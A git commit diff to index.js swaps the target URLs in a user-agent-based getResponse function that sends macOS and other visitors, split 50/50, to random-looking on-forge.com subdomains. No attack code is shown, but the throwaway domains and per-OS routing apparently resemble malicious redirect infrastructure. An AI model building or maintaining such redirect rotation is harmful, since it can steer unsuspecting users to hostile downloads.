f5a7da0533dab7c590c6e0e39b637c3e369d905b
animalinside <akshay.anand12@yahoo.com>
2026-05-05 13:16:08 +0530

    Update URLs for Group 1 and Group 2

--- index.js
+++ index.js
@@ -46,14 +46,14 @@ function getResponse(userAgent) {
         {
             id: "Group 1",
             weight: 0.5,
-            macos: "https://djbuhuhfewcdcd.on-forge.com/",
-            others: "https://djbuhuhfewcdcd.on-forge.com/"
+            macos: "https://bnfmdafhrufdsf.on-forge.com/",
+            others: "https://bnfmdafhrufdsf.on-forge.com/"
         },
         {
             id: "Group 2",
             weight: 0.5,
-            macos: "https://djbuhuhfewcdcd.on-forge.com/",
-            others: "https://djbuhuhfewcdcd.on-forge.com/"
+            macos: "https://bnfmdafhrufdsf.on-forge.com/",
+            others: "https://bnfmdafhrufdsf.on-forge.com/"
         }
     ];
 
